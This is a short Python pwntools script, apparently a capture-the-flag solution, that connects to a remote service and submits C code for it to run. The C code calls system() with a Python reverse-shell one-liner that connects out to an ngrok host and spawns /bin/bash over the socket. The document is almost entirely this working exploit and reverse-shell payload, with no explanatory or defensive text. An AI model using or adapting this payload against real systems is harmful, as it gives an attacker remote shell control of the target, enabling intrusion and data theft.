from pwn import *

# nc 35.202.233.94 1337
HOST = "35.202.233.94"
PORT = 1337

io = remote(HOST, PORT)

payload = b"""int system(const char *command);
int printf(const char *format, ...);

int main() {
    // Replace the following command with the one you want to execute
    const char *command = \"export RHOST=\\\"0.tcp.ap.ngrok.io\\\";export RPORT=17568;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\\\"RHOST\\\"),int(os.getenv(\\\"RPORT\\\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")'\";

    // Execute the command
    int result = system(command);

    // Check the result of the execution
    if (result == -1) {
        return -1;
    }

    printf(\"111\n\");
    return -1;
}
"""

io.sendline(payload)

io.interactive()
